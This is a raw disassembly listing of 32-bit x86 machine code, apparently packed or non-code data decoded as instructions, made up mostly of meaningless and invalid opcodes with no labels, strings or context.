  409996:	add    DWORD PTR [ecx+0x2d7b68ff],0xf2ff0040
  4099a0:	push   edx
  4099a1:	inc    ecx
  4099a2:	xlat   BYTE PTR ds:[ebx]
  4099a3:	xor    DWORD PTR ds:0xff17efaa,0xe716cafe
  4099ad:	push   es
	...
  4099d6:	add    BYTE PTR [eax],al
  4099d8:	push   ecx
  4099d9:	cmp    edi,0x402d5768
  4099df:	add    BYTE PTR [edi-0x58bead28],ch
  4099e5:	add    DWORD PTR ss:[eax],eax
  4099e8:	xchg   edi,eax
  4099e9:	fdivp  st(6),st
  4099eb:	jne    0x40998c
  4099ed:	mov    dh,0xef
  4099ef:	std    
  4099f0:	pusha  
  4099f1:	sub    BYTE PTR [eax-0x2e],0x34
  4099f5:	push   ds
  4099f6:	jmp    DWORD PTR [edi-0x13]
  4099f9:	sub    eax,DWORD PTR [eax+0x0]
  4099fc:	call   FWORD PTR [eax+eax*1+0x0]
  409a00:	out    0x7f,eax
  409a02:	jne    0x409a0c
  409a04:	outs   dx,DWORD PTR ds:[esi]
  409a05:	lahf   
  409a06:	std    
  409a07:	call   DWORD PTR [eax+0x1653d62f]
  409a0d:	push   edi
  409a0e:	push   0xff1e7486
  409a13:	addr16 and eax,0x3e80005e
  409a19:	jmp    0xc356a214
  409a1e:	outs   dx,BYTE PTR ds:[esi]
  409a1f:	call   FWORD PTR [ecx]
  409a21:	ins    BYTE PTR es:[edi],dx
  409a22:	push   0xdb047f53
  409a27:	test   DWORD PTR [ebp+0x43],ebp
  409a2a:	add    al,0x68
  409a2c:	cmp    al,0x4
  409a2e:	add    eax,DWORD PTR [eax-0x1804d107]
  409a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a35:	scas   al,BYTE PTR es:[edi]
  409a36:	ins    DWORD PTR es:[edi],dx
  409a37:	call   DWORD PTR [esi+0x44]
  409a3a:	rol    DWORD PTR [eax+0x0],1
	...
  409a65:	add    BYTE PTR [esi],bh
  409a67:	sbb    al,0x9f
  409a69:	push   ebx
  409a6a:	jg     0x409a70
  409a6c:	fild   DWORD PTR [ecx]
  409a6e:	ds add al,0x83
  409a71:	call   DWORD PTR [ebx-0x4]
  409a74:	pop    edx
  409a75:	xchg   ebx,eax
  409a76:	ret    
  409a77:	inc    eax
  409a78:	ins    DWORD PTR es:[edi],dx
  409a79:	push   0xffc1d48c
  409a7e:	sbb    DWORD PTR [eax-0x23c1bf2f],esp
  409a84:	add    BYTE PTR [eax],al
  409a86:	test   BYTE PTR ds:[ebp+0x75],ch
  409a8a:	inc    esi
  409a8b:	ins    BYTE PTR es:[edi],dx
  409a8c:	lock cld 
  409a8e:	xchg   ecx,eax
  409a8f:	adc    bl,bl
  409a91:	(bad)  
  409a92:	in     eax,dx
  409a93:	ret    0x6802
  409a96:	shl    ah,cl
  409a98:	sar    edi,0xe1
  409a9b:	add    eax,0x30be0003
  409aa0:	test   BYTE PTR [edi],0x56
  409aa3:	sahf   
  409aa4:	outs   dx,DWORD PTR ds:[esi]
  409aa5:	jmp    DWORD PTR [ecx-0x65]
  409aa8:	push   0xdb03ff53
  409aad:	stos   DWORD PTR es:[edi],eax
  409aae:	in     eax,dx
  409aaf:	inc    edx
  409ab0:	add    al,0x68
  409ab2:	cmp    al,0x4
  409ab4:	add    eax,DWORD PTR [eax-0x1803b9bf]
  409aba:	mov    BYTE PTR [ebx-0x5c],bl
  409abd:	ins    BYTE PTR es:[edi],dx
  409abe:	xor    DWORD PTR [esi+0x63b36d03],eax
  409ac4:	cmp    edx,0xd98e1123
	...
  409af2:	add    BYTE PTR [eax],al
  409af4:	pop    esp
  409af5:	adc    ah,bh
  409af7:	sti    
  409af8:	sbb    DWORD PTR [ecx],edx
  409afa:	jl     0x409b68
  409afc:	or     DWORD PTR [esi+0x638b6cd5],eax
  409b02:	xor    DWORD PTR [esi-0x5],0x6b6c6610
  409b09:	divps  xmm6,xmm6
  409b0c:	inc    ecx
  409b0d:	add    edx,DWORD PTR [ebx]
  409b0f:	inc    esp
  409b10:	loope  0x409b22
  409b12:	and    BYTE PTR [ecx+0x42],al
  409b15:	pop    ebx
  409b16:	pushf  
  409b17:	js     0x409afb
  409b19:	fdivr  QWORD PTR [ebx-0x35733601]
  409b1f:	fisttp DWORD PTR [edx]
  409b21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b22:	test   al,0x3
  409b24:	mov    ecx,0xff5bf586
  409b29:	sbb    BYTE PTR [esi],bl
  409b2b:	ins    BYTE PTR es:[edi],dx
  409b2c:	push   cs
  409b2d:	sub    ecx,0x3
  409b30:	xchg   ecx,eax
  409b31:	sar    DWORD PTR [eax+0x1163136c],1
  409b37:	mov    ds:0x5afe10a6,eax
  409b3c:	mov    eax,0x166bf61d
  409b41:	cdq    
  409b42:	xchg   ebp,eax
  409b43:	ret    0x1179
  409b46:	pop    esp
  409b47:	clc    
  409b48:	pop    ecx
  409b49:	cmp    esp,DWORD PTR [edi+0x41ab696b]
  409b4f:	add    eax,0xd48f003e
  409b54:	pop    eax
  409b55:	xchg   cl,dh
  409b57:	pop    ebx
	...
  409b80:	add    BYTE PTR [eax],al
  409b82:	rol    DWORD PTR [edx],1
  409b84:	mov    esi,0x7e566b
  409b89:	stos   DWORD PTR es:[edi],eax
  409b8a:	aad    0xf
  409b8c:	push   0x9b0e10
  409b91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b92:	das    
  409b93:	fs call 0xff511b37
  409b99:	cmp    DWORD PTR [edx],eax
  409b9b:	pop    edx
  409b9c:	add    BYTE PTR [esi-0x1c],bh
  409b9f:	stos   BYTE PTR es:[edi],al
  409ba0:	(bad)  
  409ba1:	cld    
  409ba2:	adc    eax,0x95915df8
  409ba7:	adc    al,ch
  409ba9:	and    eax,0xa0ff1078
  409bae:	and    BYTE PTR [ebx+0x0],0xbc
  409bb2:	jo     0x409bb3
  409bb4:	(bad)  
  409bb5:	aam    0xf1
  409bb7:	not    DWORD PTR [edi+ebp*1+0x290b1055]
  409bbe:	into   
  409bbf:	jno    0x409c29
  409bc1:	adc    ebp,esi
  409bc3:	call   0x36c6:0x3a659900
  409bca:	push   ebp
  409bcb:	stos   DWORD PTR es:[edi],eax
  409bcc:	push   eax
  409bcd:	cs scas eax,DWORD PTR es:[edi]
  409bcf:	push   edi
  409bd0:	call   0xff50c06a
  409bd5:	adc    DWORD PTR ds:0x6316ff1d,esi
  409bdb:	sbb    eax,0xe46ee908
  409be0:	jmp    0x409c4c
  409be2:	(bad)  
  409be3:	cli    
  409be4:	imul   ebp,ecx,0x0
	...
  409c0e:	add    BYTE PTR [eax],al
  409c10:	adc    al,0x86
  409c12:	adc    dh,dh
  409c14:	mov    fs,WORD PTR [ebx-0x1]
  409c17:	mov    ah,0xdb
  409c19:	mov    ds:0x7515e941,al
  409c1e:	(bad)
  409c21:	loope  0x409c67
  409c23:	fld    QWORD PTR [ebx+0x2e54fe0f]
  409c29:	adc    BYTE PTR [ebp+0x0],dh
  409c2c:	dec    ebx
  409c2d:	test   BYTE PTR ds:0xff160faa,dh
  409c33:	out    0x53,eax
  409c35:	call   0x6afb:0x1b9effff
  409c3c:	daa    
  409c3d:	xor    BYTE PTR [ebp+0x18],0xc8
  409c41:	or     ecx,DWORD PTR [ebx]
  409c43:	inc    DWORD PTR [edx]
  409c45:	icebp  
  409c46:	inc    edi
  409c47:	inc    ecx
  409c48:	daa    
  409c49:	mov    bl,0xee
  409c4b:	les    edi,FWORD PTR [eax-0x40ba767f]
  409c51:	xchg   ebx,eax
  409c52:	inc    ebp
  409c53:	call   0x1cb61e7f
  409c58:	push   0x52ff0b0b
  409c5d:	in     eax,dx
  409c5e:	inc    edi
  409c5f:	inc    ecx
  409c60:	xlat   BYTE PTR ds:[ebx]
  409c61:	mov    dl,0xd6
  409c63:	les    ecx,FWORD PTR [eax+0x77458981]
  409c69:	xor    bh,bh
  409c6b:	(bad)  
  409c6c:	xchg   edx,eax
  409c6d:	cmp    bh,bh
  409c6f:	jne    0x409c4c
  409c71:	xor    DWORD PTR ds:0xaa,0x0
	...
  409c9b:	add    BYTE PTR [eax],al
  409c9d:	add    BYTE PTR [edi+0x67e7ff17],bl
  409ca3:	dec    esi
  409ca4:	(bad)  
  409ca5:	jmp    FWORD PTR [esi]
  409ca7:	sbb    ebp,ebx
  409ca9:	(bad)  
  409caa:	loop   0x409d26
  409cac:	push   eax
  409cad:	inc    edx
  409caf:	outs   dx,BYTE PTR ds:[esi]
  409cb0:	push   DWORD PTR [ebp+0x7b]
  409cb3:	xor    DWORD PTR ds:0xff17cfaa,0xff4defe7
  409cbd:	call   FWORD PTR [esi]
  409cbf:	sbb    esp,ebx
  409cc1:	sub    edx,0x75
  409cc4:	add    BYTE PTR [edi],cl
  409cc6:	jecxz  0x409cb2
  409cc8:	(bad)  
  409cc9:	call   DWORD PTR [edi-0x29]
  409ccc:	jl     0x409cc6
  409cce:	ds add al,0xf8
  409cd1:	add    esp,0x4
  409cd4:	add    eax,DWORD PTR [eax]
  409cd6:	mov    ebp,0x39007097
  409cdb:	js     0x409c61
  409cdd:	add    BYTE PTR [esi],bh
  409cdf:	add    al,0x68
  409ce1:	jne    0x409d49
  409ce3:	mov    ebp,0xf2607ee
  409ce8:	test   eax,0xeeed29ff
  409ced:	sti    
  409cee:	and    DWORD PTR [edi-0x4],ebp
  409cf1:	out    0xaa,eax
  409cf3:	sahf   
  409cf4:	imul   edi,edi,0xff6b0f11
  409cfa:	xchg   ebx,eax
  409cfb:	or     al,0x5b
  409cfd:	popa   
  409cfe:	rol    BYTE PTR [ecx+ebp*2+0xff],0x0
	...
  409d2a:	add    BYTE PTR [eax],al
  409d2c:	jae    0x409cb6
  409d2e:	imul   esi,DWORD PTR [ebp+0x46],0xe9bdd2ac
  409d35:	lods   al,BYTE PTR ds:[esi]
  409d36:	cmp    DWORD PTR [ebp+0x16],0x11
  409d3a:	add    ebp,edi
  409d3c:	cwde   
  409d3d:	es idiv dh
  409d40:	dec    ebx
  409d41:	push   esp
  409d42:	imul   esi,DWORD PTR [ebp+0x36],0xc1bdc6ac
  409d49:	inc    esp
  409d4a:	pop    ebp
  409d4b:	push   cs
  409d4c:	mov    ecx,0x2bff5ac6
  409d51:	je     0x409dbc
  409d53:	jne    0x409d8b
  409d55:	ins    BYTE PTR es:[edi],dx
  409d56:	add    bh,BYTE PTR [esi+0x756964a1]
  409d5c:	stos   BYTE PTR es:[edi],al
  409d5d:	pop    esp
  409d5e:	out    dx,eax
  409d5f:	pop    es
  409d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d61:	sbb    al,0xa9
  409d63:	dec    DWORD PTR [ecx+0x3ee3e780]
  409d69:	nop
  409d6a:	push   cs
  409d6b:	cmp    ebx,0x63
  409d6e:	add    BYTE PTR [ebp+0x41],dh
  409d71:	pop    ebx
  409d72:	jb     0x409d32
  409d74:	pop    ebp
  409d75:	or     eax,0x62eb6919
  409d7a:	rcl    DWORD PTR [edi+0x5cce0d9b],0x44
  409d81:	sub    ecx,0xd162d368
  409d87:	mov    ds:0x68b60d83,eax
  409d8c:	mov    bl,0x7
  409d8e:	shl    DWORD PTR [eax+0x0],0x0
	...
  409dba:	dec    BYTE PTR [esi+eiz*4]
  409dbd:	push   0x48910fb3
  409dc2:	dec    BYTE PTR [esi+edx*4]
  409dc5:	push   0x50811393
  409dca:	dec    BYTE PTR [esi+eax*4]
  409dcd:	push   0x38910b93
  409dd2:	dec    BYTE PTR [esi+esi*2]
  409dd5:	push   0x4080ff73
  409dda:	dec    BYTE PTR [esi+eiz*2]
  409ddd:	push   0xa850f773
  409de2:	dec    BYTE PTR [esi+edx*2]
  409de5:	cmp    bh,ah
  409de7:	aaa    
  409de8:	jmp    0x684062bb
  409ded:	aas    
  409dee:	into   
  409def:	add    al,0x3e
  409df1:	push   0x58e96856
  409df6:	clc    
  409df7:	sub    DWORD PTR [ecx],0xffffffcf
  409dfa:	(bad)  
  409dfb:	pop    edx
  409dfc:	xchg   ecx,eax
  409dfd:	scas   al,BYTE PTR es:[edi]
  409dfe:	adc    bl,BYTE PTR [edx-0x582e2417]
  409e04:	test   al,0x3
  409e06:	es mov ch,0xb4
  409e09:	ret    0x7491
  409e0c:	dec    eax
  409e0d:	iret   
  409e0e:	(bad)  
  409e0f:	pop    edx
  409e10:	xchg   ecx,eax
  409e11:	pushf  
  409e12:	jmp    0xc85:0xe6e90099
  409e19:	out    dx,al
  409e1a:	arpl   WORD PTR [eax+ebp*8+0x50],dx
	...
  409e46:	add    BYTE PTR [eax],al
  409e48:	loopne 0x409e55
  409e4a:	call   DWORD PTR [ecx+0x4d]
  409e4d:	pop    ebx
  409e4e:	out    dx,eax
  409e4f:	xchg   edi,eax
  409e50:	jp     0x409ead
  409e52:	push   ebp
  409e53:	sub    BYTE PTR [edx],bh
  409e55:	cmp    esp,0x1d
  409e58:	or     DWORD PTR [edi+eiz*2],0xffffffb9
  409e5c:	outs   dx,BYTE PTR ds:[esi]
  409e5d:	fwait
  409e5e:	add    BYTE PTR [ecx-0x76],al
  409e61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e62:	inc    ecx
  409e63:	jmp    0x2894be7d
  409e68:	inc    edx
  409e69:	and    esp,0x35
  409e6c:	sti    
  409e6d:	or     edi,esi
  409e6f:	sbb    al,0x16
  409e71:	or     eax,0x5075e175
  409e76:	inc    BYTE PTR [esi-0x16eb7c5f]
  409e7c:	push   0xf0867cd
  409e81:	fwait
  409e82:	add    BYTE PTR [ecx],al
  409e84:	or     ah,BYTE PTR [edi+0x4d05e941]
  409e8a:	push   ebp
  409e8b:	test   al,0x3d
  409e8d:	sbb    DWORD PTR ds:0x670c02bc,0xffffffdd
  409e94:	out    dx,al
  409e95:	call   0xe941:0xa633d100
  409e9c:	pop    eax
  409e9d:	xchg   BYTE PTR [esi+esi*1],cl
  409ea0:	scas   eax,DWORD PTR es:[edi]
  409ea1:	push   ebx
  409ea2:	call   0xff4cba83
  409ea7:	je     0x409f28
  409ea9:	(bad)  
  409eab:	push   ds
	...
  409ed4:	add    BYTE PTR [eax],al
  409ed6:	scas   eax,DWORD PTR es:[edi]
  409ed7:	pop    edi
  409ed8:	(bad)  
  409ed9:	fdiv   QWORD PTR [edi-0xa16be5e]
  409edf:	mov    ds:0x579700ac,al
  409ee4:	or     eax,eax
  409ee6:	or     al,BYTE PTR [edx]
  409ee8:	mov    BYTE PTR [ebp+0x6f],0x57
  409eec:	add    BYTE PTR [eax],al
  409eee:	addr16 dec esp
  409ef0:	inc    ebp
  409ef1:	hlt    
  409ef2:	pusha  
  409ef3:	or     al,0xff
  409ef5:	dec    DWORD PTR ds:0xfd006a57
  409efb:	push   esi
  409efc:	push   0x0
  409efe:	repnz sbb dh,bl
  409f01:	push   eax
  409f02:	rcr    dl,cl
  409f04:	repz test DWORD PTR [eax+0x7aff5074],0xe375ff77
  409f0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f10:	push   ds
  409f11:	lods   al,BYTE PTR ds:[esi]
  409f12:	pop    ss
  409f13:	pop    edi
  409f14:	or     eax,eax
  409f16:	dec    ebx
  409f17:	pop    ebp
  409f18:	jmp    0x409f5a
  409f1a:	aas    
  409f1b:	mov    DWORD PTR [eax+0x41],ecx
  409f1e:	daa    
  409f1f:	xor    BYTE PTR [ebp+0xc],0xaf
  409f23:	or     al,0xc2
  409f25:	inc    DWORD PTR [eax+0x6a8dd085]
  409f2b:	jp     0x409f24
  409f2d:	jmp    DWORD PTR [eax+0x2e]
  409f30:	push   ecx
  409f31:	call   0x403cfe
  409f36:	outs   dx,BYTE PTR ds:[esi]
  409f37:	fucomi st,st(7)
  409f39:	test   DWORD PTR [eax],0x0
	...
  409f63:	add    BYTE PTR [eax-0x7f],dh
  409f66:	push   DWORD PTR [ebp-0x8689]
  409f6c:	or     BYTE PTR [ebx],0x7
  409f6f:	call   0x401f7e
  409f74:	jo     0x409f41
  409f76:	out    dx,eax
  409f77:	mul    DWORD PTR [eax-0x7f]
  409f7a:	call   0xffc1c024
  409f7f:	(bad)  
  409f80:	fidiv  DWORD PTR [esi-0x15]
  409f83:	xchg   ebp,eax
  409f84:	ds jno 0x409f77
  409f87:	sti    
  409f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f89:	inc    eax
  409f8a:	call   0x3e08:0x414b3e00
  409f91:	out    dx,eax
  409f92:	jns    0x409f80
  409f94:	mov    ebp,0x3e6a6738
  409f99:	fdivp  st(4),st
  409f9b:	(bad)  
  409f9c:	repz or ebx,DWORD PTR [ebx-0x46]
  409fa0:	mov    ds:0x3896529,al
  409fa5:	xor    ah,bl
  409fa7:	addr16 jmp 0x5b0b:0xd3ff0432
  409faf:	mov    bh,0x40
  409fb1:	leave  
  409fb2:	fs push 0x3e
  409fb5:	pushf  
  409fb6:	(bad)  
  409fb7:	push   esp
  409fb8:	jg     0x409fae
  409fba:	fisub  DWORD PTR [edi-0x6e]
  409fbd:	xor    eax,DWORD PTR [edi+edi*8]
  409fc0:	imul   ebp,DWORD PTR [esi-0x23c1bf44],0xfffffff0
  409fc7:	rol    DWORD PTR [eax],0x0
	...
  409ff2:	adc    ecx,ebx
  409ff4:	clc    
  409ff5:	mov    edi,0x4fd31192
  409ffa:	add    DWORD PTR [edi],ecx
  409ffc:	sti    
  409ffd:	out    0xd3,eax
  409fff:	(bad)  
  40a000:	gs jmp esi
  40a003:	cmp    esp,DWORD PTR [ebp+0x32de9ff]
  40a009:	push   0xffc1cbb6
  40a00e:	popa   
  40a00f:	sub    eax,0x993e40cf
  40a014:	das    
  40a015:	stos   BYTE PTR es:[edi],al
  40a016:	jbe    0x409fcb
  40a018:	add    ch,al
  40a01a:	ja     0x40a052
  40a01c:	inc    DWORD PTR gs:[ebp+0x34]
  40a020:	lock push cs
  40a022:	push   cs
  40a023:	in     al,0x63
  40a025:	jne    0x40a05d
  40a027:	pop    ebx
  40a028:	adc    ecx,ebx
  40a02a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a02b:	or     DWORD PTR [esi],ebx
  40a02d:	pop    esp
  40a02e:	cmp    dl,cl
  40a030:	adc    eax,0x815b2465
  40a035:	mov    ?,edx
  40a037:	fwait
  40a038:	jmp    0xa8efba18
  40a03d:	add    esp,esi
  40a03f:	pop    esp
  40a040:	jmp    0xc9335e48
  40a045:	inc    ecx
  40a046:	imul   ecx,DWORD PTR [ecx],0x59ea43f2
  40a04c:	cmp    esp,edx
  40a04e:	pop    eax
  40a04f:	(bad)  
  40a050:	loope  0x40a0ad
  40a052:	cld    
  40a053:	push   es
  40a054:	into   
  40a055:	add    BYTE PTR fs:[eax],al
	...
  40a080:	push   esi
  40a081:	ja     0xe9b4e1eb
  40a087:	fcmovnb st,st(1)
  40a089:	xchg   ebx,eax
  40a08a:	sub    BYTE PTR [esi+eiz*4],al
  40a08d:	test   BYTE PTR ds:0xeb8129c3,dl
  40a093:	add    edi,DWORD PTR [esi]
  40a095:	fist   DWORD PTR [eax-0x69f70094]
  40a09b:	clc    
  40a09c:	ror    DWORD PTR [edi+0x879d3de],1
  40a0a2:	cld    
  40a0a3:	sti    
  40a0a4:	sbb    DWORD PTR [ebx+0x7d],esp
  40a0a7:	fs stc 
  40a0a9:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0ac:	icebp  
  40a0ad:	or     BYTE PTR [ebx],al
  40a0af:	or     ch,cl
  40a0b1:	mov    ?,ecx
  40a0b3:	pop    ebx
  40a0b4:	fs pop es
  40a0b6:	pop    esi
  40a0b7:	fs fs cmp al,0x56
  40a0bb:	out    dx,al
  40a0bc:	cmp    ebx,esi
  40a0be:	fsub   DWORD PTR [edi-0x37]
  40a0c1:	or     bl,dl
  40a0c3:	pop    es
  40a0c4:	ror    DWORD PTR [esi+0x7205bf1],0x0
  40a0cb:	sbb    cl,BYTE PTR ss:[eax]
  40a0ce:	jne    0x40a0fd
  40a0d0:	and    cl,BYTE PTR [esi-0x38a3eef8]
  40a0d6:	(bad)  
  40a0d7:	push   ds
  40a0d8:	push   esp
  40a0d9:	sbb    eax,0xd580e904
  40a0de:	jmp    0x40a14a
  40a0e0:	dec    ecx
  40a0e1:	pop    es
  40a0e2:	push   esi
  40a0e3:	sahf   
	...
  40a10c:	add    BYTE PTR [eax],al
  40a10e:	or     BYTE PTR [bx+di-0x1a],ch
  40a112:	loop   0x40a0a1
  40a114:	or     BYTE PTR [ecx],al
  40a116:	inc    bl
  40a118:	(bad)  
  40a119:	out    dx,al
  40a11a:	out    0x9d,eax
  40a11c:	cld    
  40a11d:	jb     0x40a166
  40a11f:	cmp    DWORD PTR [eax+0x28],ecx
  40a122:	inc    edx
  40a123:	aam    0x3c
  40a125:	sbb    eax,DWORD PTR [edx+0x1d69009b]
  40a12b:	pop    ebx
  40a12c:	je     0x40a168
  40a12e:	push   edx
  40a12f:	mov    dl,BYTE PTR [ebp+0x28]
  40a132:	inc    edx
  40a133:	mov    al,0xe8
  40a135:	leave  
  40a136:	loopne 0x40a192
  40a138:	add    dl,ah
  40a13a:	jge    0x40a0cb
  40a13c:	pop    ds
  40a13d:	aas    
  40a13e:	xchg   edx,eax
  40a13f:	dec    edi
  40a140:	enter  0x9d9e,0xab
  40a144:	push   0xbdf83de9
  40a149:	add    DWORD PTR [ebp+ebp*4+0x8cde941],ebp
  40a150:	jne    0x40a143
  40a152:	gs fwait
  40a154:	out    0x76,eax
  40a156:	pop    ebp
  40a157:	repz dec eax
  40a159:	das    
  40a15a:	pop    ebp
  40a15b:	or     BYTE PTR [eax+0x69],ch
  40a15e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a15f:	call   0xe9a9:0xcd65b600
  40a166:	cmp    eax,0x3cd5c054
  40a16b:	mov    cl,0xe8
  40a16d:	add    cl,dl
  40a16f:	xchg   ebx,eax
  40a170:	(bad)  
  40a171:	inc    DWORD PTR [eax]
	...
  40a19b:	add    bh,dl
  40a19d:	repz (bad) 
  40a19f:	(bad)  
  40a1a0:	clc    
  40a1a1:	mov    esp,0x1ed28e67
  40a1a6:	dec    DWORD PTR [edi+0x58]
  40a1a9:	and    al,BYTE PTR [edi]
  40a1ab:	call   0x401645
  40a1b0:	aas    
  40a1b1:	or     BYTE PTR [ebp+0x17838ff],bh
  40a1b7:	inc    esi
  40a1b8:	pop    ss
  40a1b9:	cmp    eax,0x153d7500
  40a1be:	sti    
  40a1bf:	xor    esp,DWORD PTR [edi]
  40a1c1:	out    0xfe,al
  40a1c3:	call   FWORD PTR [eax+0x7c]
  40a1c6:	repnz scas al,BYTE PTR es:[edi]
  40a1c8:	pop    ds
  40a1c9:	push   esp
  40a1ca:	jne    0x40a159
  40a1cc:	js     0x40a1f0
  40a1ce:	sti    
  40a1cf:	push   edx
  40a1d1:	push   esi
  40a1d2:	call   0xffbd4e4e
  40a1d7:	pop    edi
  40a1d8:	sbb    DWORD PTR [esi-0x3bd8fb3e],edx
  40a1de:	mov    esp,ebp
  40a1e0:	jg     0x40a241
  40a1e2:	add    bh,ch
  40a1e4:	cdq    
  40a1e5:	repnz scas al,BYTE PTR es:[edi]
  40a1e7:	push   ebp
  40a1e8:	push   esi
  40a1e9:	pop    edi
  40a1ea:	push   DWORD PTR [ebp+0x2b]
  40a1ed:	jp     0x40a264
  40a1ef:	or     BYTE PTR [edi-0x47001955],bh
  40a1f5:	repnz (bad) 
  40a1f7:	jmp    FWORD PTR [eax+0x52b567bc]
  40a1fd:	and    bh,bh
  40a1ff:	inc    BYTE PTR [eax]
	...
  40a229:	add    dl,dh
  40a22b:	push   esi
  40a22c:	push   DWORD PTR [ebp-0x21]
  40a22f:	jb     0x40a1e9
  40a231:	out    0x58,al
  40a233:	jns    0x40a1fe
  40a235:	ret    0x5acf
  40a238:	push   ebp
  40a239:	mov    edi,DWORD PTR [esi]
  40a23b:	mov    al,ds:0x9c3a7562
  40a240:	adc    al,dl
  40a242:	rcr    DWORD PTR [ebp-0x5cd3ff2],0xea
  40a249:	cdq    
  40a24a:	or     esi,DWORD PTR [ebx-0x5669affe]
  40a250:	inc    esp
  40a251:	jmp    DWORD PTR [ecx+0x13feb2c4]
  40a257:	or     al,0x6b
  40a259:	stos   DWORD PTR es:[edi],eax
  40a25a:	xchg   ecx,eax
  40a25b:	ins    DWORD PTR es:[edi],dx
  40a25c:	(bad)  
  40a25d:	call   0xffa33a09
  40a262:	ja     0x40a296
  40a264:	or     eax,DWORD PTR [eax]
  40a266:	adc    ecx,DWORD PTR [ecx+0x107a836f]
  40a26c:	in     al,dx
  40a26d:	call   edi
  40a26f:	sti    
  40a270:	popa   
  40a271:	jne    0x40a2a9
  40a273:	sub    al,0x9d
  40a275:	mov    edx,0x458b2559
  40a27a:	push   edx
  40a27b:	call   0xffc3:0x4ebb6804
  40a282:	(bad)  
  40a284:	mov    dh,0x40
  40a286:	lds    edx,FWORD PTR ds:[esi]
  40a289:	stos   BYTE PTR es:[edi],al
  40a28a:	xchg   BYTE PTR [ebx],dh
  40a28c:	add    al,0xe8
	...
  40a2b6:	add    BYTE PTR [eax],al
  40a2b8:	mov    edi,0x35ff60b3
  40a2bd:	mov    ah,0xd7
  40a2bf:	adc    ebp,DWORD PTR [esi+0x6c]
  40a2c2:	add    eax,DWORD PTR [eax]
  40a2c4:	and    DWORD PTR [esi-0x36c014c],ebp
  40a2ca:	push   0x63
  40a2cc:	sbb    eax,0x8fe860dd
  40a2d1:	inc    edi
  40a2d2:	popa   
  40a2d3:	jmp    DWORD PTR [esp+esi*8-0x16]
  40a2d7:	mov    WORD PTR [eax+0x1680433],ss
  40a2dd:	pop    ebx
  40a2de:	mov    esp,0x1404d9c2
  40a2e3:	scas   al,BYTE PTR es:[edi]
  40a2e4:	xchg   BYTE PTR [ecx+ebp*8+0x4e1b6c6b],bl
  40a2eb:	popa   
  40a2ec:	xor    eax,0x9f7bd1b
  40a2f1:	jae    0x40a2db
  40a2f3:	add    esp,DWORD PTR [ecx+0x336098c4]
  40a2f9:	push   ebx
  40a2fa:	inc    ecx
  40a2fb:	sbb    BYTE PTR [ebp+0x5c6c2605],bl
  40a301:	enter  0x611d,0x24
  40a305:	pop    ebx
  40a306:	cmp    DWORD PTR [esi-0x10],0x26ebe99b
  40a30d:	lods   eax,DWORD PTR ds:[esi]
  40a30e:	test   al,0x3
  40a310:	jns    0x40a361
  40a312:	push   ebx
  40a313:	int3   
  40a314:	(bad)  
  40a315:	pop    edx
  40a316:	add    DWORD PTR ds:0xcee057e,esp
	...
  40a344:	add    BYTE PTR [eax],al
  40a346:	jle    0x40a2d6
  40a348:	div    BYTE PTR [ebx+0xc540609]
  40a34e:	push   ax
  40a350:	(bad)  
  40a351:	pusha  
  40a352:	dec    ecx
  40a353:	repnz rcr BYTE PTR [edi+0x4530541],1
  40a35a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a35b:	out    0x16,al
  40a35d:	ret    
  40a35e:	xor    DWORD PTR [ebp+0x28],edi
  40a361:	mov    edx,0x16ae5b7e
  40a366:	aam    0x93
  40a368:	sub    BYTE PTR [esi+eiz*1],al
  40a36b:	add    ebx,DWORD PTR [esi+0x60]
  40a36e:	adc    DWORD PTR [ecx-0x57],edx
  40a371:	xlat   BYTE PTR ds:[ebx]
  40a372:	cmp    BYTE PTR [ebx+0x538b6139],ch
  40a378:	xchg   ecx,eax
  40a379:	arpl   ax,di
  40a37b:	add    al,0x7e
  40a37d:	imul   eax,DWORD PTR [eax],0xffffffc8
  40a380:	push   DWORD PTR [ebp+0x5e]
  40a383:	jno    0x40a385
  40a385:	add    DWORD PTR [ebp+ebp*4-0x791a16bf],edx
  40a38c:	push   esi
  40a38d:	test   al,0x3d
  40a38f:	add    al,0x35
  40a391:	xor    ebp,0xffffff9b
  40a394:	add    BYTE PTR [ecx+0x6e],al
  40a397:	(bad)  
  40a398:	inc    BYTE PTR [esi+0x4a]
  40a39b:	sbb    esi,DWORD PTR [esi+ebp*8-0x13]
  40a39f:	xchg   esp,eax
  40a3a0:	(bad)  
  40a3a1:	mov    esp,0x2fb5f335
  40a3a6:	push   ds
  40a3a7:	add    al,0xe8
  40a3a9:	dec    ebp
	...
  40a3d2:	add    BYTE PTR [eax],al
  40a3d4:	mov    ecx,0x9193ff04
  40a3d9:	add    eax,0x2315e175
  40a3de:	dec    BYTE PTR [esi]
  40a3e0:	push   ds
  40a3e1:	jno    0x40a3fd
  40a3e3:	push   es
  40a3e4:	nop
  40a3e5:	pop    esp
  40a3e6:	call   0xff44831a
  40a3eb:	and    DWORD PTR [edx],0x4
  40a3ee:	jne    0x40a3d1
  40a3f0:	aad    0x1e
  40a3f2:	(bad)  
  40a3f3:	out    0xf9,al
  40a3f5:	add    esi,DWORD PTR [ebp-0x23]
  40a3f8:	icebp  
  40a3f9:	lea    ecx,[eax]
  40a3fb:	shr    ebx,0xc1
  40a3fe:	dec    dh
  40a400:	repz sbb BYTE PTR [ecx+ebp*8],al
  40a404:	not    al
  40a406:	jmp    0x40a3c6
  40a408:	pop    ss
  40a409:	push   eax
  40a40a:	call   0xff4526bc
  40a40f:	loop   0x40a48e
  40a411:	(bad)  
  40a412:	dec    esi
  40a413:	adc    DWORD PTR [ecx-0x3216be54],esi
  40a419:	sti    
  40a41a:	dec    edi
  40a41b:	test   eax,0x39500469
  40a420:	retf   0x7b
  40a423:	add    bh,ah
  40a425:	je     0x40a3e5
  40a427:	push   0x3fcd35
  40a42c:	inc    edi
  40a42d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a42e:	jne    0x40a438
